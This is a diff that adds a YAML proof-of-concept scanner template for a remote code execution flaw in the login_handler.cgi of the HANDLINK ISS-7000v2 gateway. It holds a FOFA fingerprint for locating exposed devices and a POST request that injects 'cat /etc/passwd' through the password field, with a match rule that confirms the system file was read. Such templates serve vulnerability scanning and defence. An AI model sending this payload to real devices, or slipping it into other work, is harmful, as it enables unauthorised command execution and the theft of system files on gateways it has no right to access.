@@ -1,0 +1,18 @@
+id: poc-yaml-handlink-iss-7000v2-gateway-login-handler-cgi-rce
+info:
+  name: HANDLINK-ISS-7000v2网关 login_handler.cgi 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: ISS-7000v2网关
+  fofa: icon_hash="-842942564"
+requests:
+- method: POST
+  path: /login_handler.cgi
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username=admin&password=admin|cat /etc/passwd&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=
+  expression: status_code == 200 && contains(headers,"root:") && contains(headers,"/bin")
+    && contains(headers,"ISS-7000 v2")
+variables: {}
+transport: http
